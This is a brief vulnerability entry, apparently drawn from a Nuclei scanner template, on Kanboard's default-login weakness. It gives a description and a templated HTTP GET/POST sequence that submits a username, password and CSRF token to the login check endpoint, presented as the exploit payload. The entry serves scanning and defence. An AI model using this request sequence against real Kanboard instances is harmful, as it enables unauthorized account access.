# Vulnerability: Kanboard - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`kanboard-default-login.yaml`)

## Description
Kanboard contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?controller=AuthController&action=login HTTP/1.1
Host: {{Hostname}}

POST /?controller=AuthController&action=check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}&csrf_token={{csrf_token}}
```

